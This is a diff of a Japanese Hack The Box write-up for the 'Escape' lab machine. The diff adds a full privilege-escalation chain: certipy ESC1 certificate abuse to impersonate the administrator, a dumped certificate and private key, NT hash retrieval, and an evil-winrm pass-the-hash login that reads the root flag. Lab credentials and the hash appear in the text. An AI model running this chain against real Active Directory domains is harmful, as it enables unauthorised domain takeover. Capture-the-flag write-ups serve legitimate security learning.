@@ -7,6 +7,7 @@ https://app.hackthebox.com/machines/531
 [!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
 Open 10.129.80.180:53
 Open 10.129.80.180:88
+Open 10.129.80.180:445
 Open 10.129.80.180:593
 Open 10.129.80.180:636
 Open 10.129.80.180:1433
@@ -20,7 +21,7 @@ Open 10.129.80.180:49689
 Open 10.129.80.180:49711
 Open 10.129.80.180:49721
 Open 10.129.80.180:49742
-10.129.80.180 -> [53,88,593,636,1433,3268,3269,5985,9389,49667,49690,49689,49711,49721,49742]
+10.129.80.180 -> [53,88,445,593,636,1433,3268,3269,5985,9389,49667,49690,49689,49711,49721,49742]
 ```
 
 
@@ -54,7 +55,7 @@ Using domain: WORKGROUP, user: kali
 smb://10.129.80.180/Public/SQL Server Procedures.pdf 
 Downloaded 48.39kB in 15 seconds
 ```
-pdfはmssqlに関するもの、step1で1433番がオープンであったことを確認したのでmssqlが動作している  
+pdfはmssqlに関するもの、step1で1433番がオープンであったことを確認したのでmssqlが動作していると推測  
 ユーザ名`PublicUser`パスワード`GuestUserCantWrite1@`を確認
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Escape_01.png">  
 pdfのクレデンシャルでmssqlにログイン成功
@@ -75,7 +76,7 @@ SQL (PublicUser  guest@master)>
 
 
 ## STEP 3
-mssqlの情報を列挙  
+あまり使わないmetasploitでmssqlの情報を列挙  
 xp_cmdshellは無効だが、xp_dirtreeは使用可能みたい  
 ```sh
 msf auxiliary(scanner/mssql/mssql_login) > use auxiliary/admin/mssql/mssql_enum
@@ -351,7 +352,7 @@ ADCS        10.129.80.180   389    DC               [*] Starting LDAP search wit
 ADCS        10.129.80.180   389    DC               Found PKI Enrollment Server: dc.sequel.htb
 ADCS        10.129.80.180   389    DC               Found CN: sequel-DC-CA
 ```
-脆弱なテンプレートESC1を発見
+ESC1に該当する脆弱なテンプレートを発見
 ```sh
 └─$ certipy-ad find -stdout -target 10.129.80.180 -enabled -vulnerable -u ryan.cooper -p NuclearMosquito3
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
@@ -445,15 +446,123 @@ Certificate Templates
     [!] Vulnerabilities
       ESC1                              : Enrollee supplies subject and template allows client authentication.
 ```
+administratorのpfx取得  
+pfxから取り出せるpemを使用したpassthecertiricateでwinrmログインも考えたが、5986番は開いていなかったので断念
 ```sh
-└─$ certipy-ad req -ca sequel-DC-CA -template ESC1 -upn administrator@sequel.htb -target 10.129.80.180 -u ryan.cooper -p NuclearMosquito3 
+└─$ certipy-ad req -ca sequel-DC-CA -template UserAuthentication -upn administrator@sequel.htb -out administrator -target 10.129.80.180 -u ryan.cooper -p NuclearMosquito3
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via RPC
-[*] Request ID is 14
-[-] Got error while requesting certificate: code: 0x80094800 - CERTSRV_E_UNSUPPORTED_CERT_TYPE - The requested certificate template is not supported by this CA.
-Would you like to save the private key? (y/N): y
-[*] Saving private key to '14.key'
-[*] Wrote private key to '14.key'
-[-] Failed to request certificate
+[*] Request ID is 17
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator@sequel.htb'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+```
+```sh
+└─$ openssl pkcs12 -in administrator.pfx -passin pass:'' -info -nodes
+MAC: sha256, Iteration 2048
+MAC length: 32, salt length: 8
+PKCS7 Data
+Certificate bag
+Bag Attributes
+    friendlyName: 
+    localKeyID: F9 DA D2 42 43 ED 85 80 79 A5 DA 3A 5F 26 F2 02 6E 96 C5 28 
+subject=CN=Ryan.cooper
+issuer=DC=htb, DC=sequel, CN=sequel-DC-CA
+-----BEGIN CERTIFICATE-----
+MIIF4DCCBMigAwIBAgITHgAAABEQNHvqrtc1XwAAAAAAETANBgkqhkiG9w0BAQsF
+ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
+MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjUxMDI1MTExMzEzWhcNMzUxMDIz
+MTExMzEzWjAWMRQwEgYDVQQDEwtSeWFuLmNvb3BlcjCCASIwDQYJKoZIhvcNAQEB
+BQADggEPADCCAQoCggEBALqsFdps6r+snahDis3f3/E8WxFXaq4djqqvv7xHENug
+AqIELTToIPXd17ZiK+aVV6tg6DTw2JPkWZhVk1wgOAsSUo9wNAp0GR22l21apHcj
+Fl5/EopbuFMbFs8jpcOGNVD9eoVgC+KSZ59en2V99Pnow2Peb3dMPPAMK/sKx6Pb
+hUDdTGno8NVY5Lhyc/naqxYUVwZUNfxFsFeu8DEkrf0mWEFAvnXlS03d30fERbWf
+KFrIzZKzDeK0j5m46mJ3wiPH7w3Bm9kRxO0bRZhqJjnfSmijq0reOHMbaTUw9fB2
+OcYCgOQEY5AyREWIuroS8JxSZZWVCaGrkZCXrJT+mQ0CAwEAAaOCAvcwggLzMDMG
+A1UdEQQsMCqgKAYKKwYBBAGCNxQCA6AaDBhhZG1pbmlzdHJhdG9yQHNlcXVlbC5o
+dGIwHQYDVR0OBBYEFG52n2oS/g3q0TtzVLJfzuhRVVqLMB8GA1UdIwQYMBaAFGKf
+MqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOggbCGga1sZGFw
+Oi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVibGljJTIwS2V5
+JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zZXF1
+ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RD
+bGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEEgbAwga0wgaoG
+CCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049QUlBLENOPVB1
+YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRp
+b24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xh
+c3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTAOBgNVHQ8BAf8EBAMCBaAwPQYJKwYB
+BAGCNxUHBDAwLgYmKwYBBAGCNxUIh6vzdoXcplaH/ZU1g7/DWYOJyjWBd9/KCIae
+7CkCAWUCAQQwKQYDVR0lBCIwIAYIKwYBBQUHAwIGCCsGAQUFBwMEBgorBgEEAYI3
+CgMEMDUGCSsGAQQBgjcVCgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYK
+KwYBBAGCNwoDBDBEBgkqhkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggq
+hkiG9w0DBAICAIAwBwYFKw4DAgcwCgYIKoZIhvcNAwcwDQYJKoZIhvcNAQELBQAD
+ggEBAGMvcDJS+XwF2LN2n25U+5I2XyAJdaJV+v8OwRXGOGBlnPK0JkA/6RA5KxUN
+7QyT3DeCSkkM4mYjzZXGInK/lvHpXEp/X5+GNZVkg5zZYjAg3KdYK5QjJeRw2pb/
+KePpT8NGrQKLBXG47KMcA1rdLmDYND/hQKxqYcztuPGKe5/FBygC8ckZrWBDB4iq
+fMlsMvotJdsy8BXImhAz2bzFBXY+bLR/Va6r8uTGXKim0N7KufCOfaDlSxJkVLhI
+w3wYmT4mXdWbtB5F9DxfTu37JQEHku9K5gjw0ltGEZqjA4oS4XG2CPs2inhn2Edl
+QVgO2tHaWLrKgr9yoH+gN3T71LI=
+-----END CERTIFICATE-----
+PKCS7 Data
+Key bag
+Bag Attributes
+    friendlyName: 
+    localKeyID: F9 DA D2 42 43 ED 85 80 79 A5 DA 3A 5F 26 F2 02 6E 96 C5 28 
+Key Attributes: <No Attributes>
+-----BEGIN PRIVATE KEY-----
+MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQC6rBXabOq/rJ2o
+Q4rN39/xPFsRV2quHY6qr7+8RxDboAKiBC006CD13de2YivmlVerYOg08NiT5FmY
+VZNcIDgLElKPcDQKdBkdtpdtWqR3IxZefxKKW7hTGxbPI6XDhjVQ/XqFYAvikmef
+Xp9lffT56MNj3m93TDzwDCv7Csej24VA3Uxp6PDVWOS4cnP52qsWFFcGVDX8RbBX
+rvAxJK39JlhBQL515UtN3d9HxEW1nyhayM2Ssw3itI+ZuOpid8Ijx+8NwZvZEcTt
+G0WYaiY530poo6tK3jhzG2k1MPXwdjnGAoDkBGOQMkRFiLq6EvCcUmWVlQmhq5GQ
+l6yU/pkNAgMBAAECggEAFmcpLz/jk3HasPM8MRWFaYz6C/R/DdrnwJXbj7PCsuz6
+6+lO6JrUO9WuOgoBpUh2j0+PxqzB/UvKMeVRTFzkhPWjuWm4oSmKSx3bAgl/E/o+
+yMP83GSCFF07qUvorLTKaMgnAGNEweIatA512Ecb07NK4c0z+PAKHzACxjvmtkQh
+a8veN7+VjA4FSIoXImX4jigJ4C2UPs1knOS6lRXwxwkh+DjpC+wpIWSv6PbGpl8r
+ETcL5/aERnY7k0MRkM5gHTObwYMsa2KDYcBPJWWyD2H+UMcbm1ow5yITPZjsdaYI
+gADRhsFbUzhmtjSjwGMfJISCYBMhc/UGYgmPnt5i6QKBgQDlP17K/fwC72x9kTti
+oH0GmHlmF9WiT5Aig2xvd/yEEQky29muB8Jqg9PcWqLhXan0A5fgAXe/oaIEM/VZ
+3NNhV/+i0crYKN59ARFbCTF1Ywz20+z9GQ3L5y6GXqaFhk5rBI6V5qUH1eJwZXyO
+PG2AQMiuKUzxSnqu965ujP4i5QKBgQDQdM2a/hkSRCom91MR4vGZpd9bQnhpVVAM
+Bo1MqQdLZAyDha2WY06lReQdi7tfu7MeBCxTnSWWl+UEN3vZoSOesS7qZgCUdXoz
++DB06lAWEdqtQj0mKy5PKUfOOKTZpAjdnvMO+kBtPo5a4bycbF4E2rcZsQX23KOy
+NEYW0jDzCQKBgDhtD6UBPP1v9xE1JRvSitOLxh3F8hSAZubH2HHbY7ESDGSTTpIS
+YN0c05HiUUMNbd6c384ILnRhkWJdc5+JxhGoukhWQQpRjOnR0HbK3XyaQ7+hTCzD
+9OxiW8ZBF9W3yCd5OKtW2PoDwDeQE0djQkSWLY8IpWKixW25kxqs44StAoGAbce1
+qBR9e6MuV8sUkmzkM7ipQlRlOYPWXh7tNxwlXUzZUkKKQpMWDfAazHyUNzyQfhRQ
+i9BMxVxFHc1iiiBUs/Q38vW5BHZB3zCrxEbJ2nWYpnol3f4Lq2DgEfi+yGecy6oz
+8wVT/LRfH/mV7QMdGI1etEcIDxPvmZ/x8X7MjJECgYBD8recL9DADQZBJo/xEIMZ
+Bhsla3stFGQeNMMMn7MTBWf6bFzgXcmzAjItS83UjOQJt+glR88b5nXjidXmtn0I
+cDri0QM0uAAPs1iPV7OQmaiSe5ODdsD7CEDsQzJepLja6VmjGdFU1N1ILRgWM2ji
+nt93DXuBYgFnL+WoZzeFIg==
+-----END PRIVATE KEY-----
+```
+```sh
+└─$ certipy-ad auth -pfx administrator.pfx -no-save -dc-ip 10.129.80.180            
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator@sequel.htb'
+[*] Using principal: 'administrator@sequel.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
+```
+```sh
+└─$ evil-winrm -i 10.129.80.180 -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../desktop/root.txt
+b5a13a12aae3171df977e2c051d44261
 ```
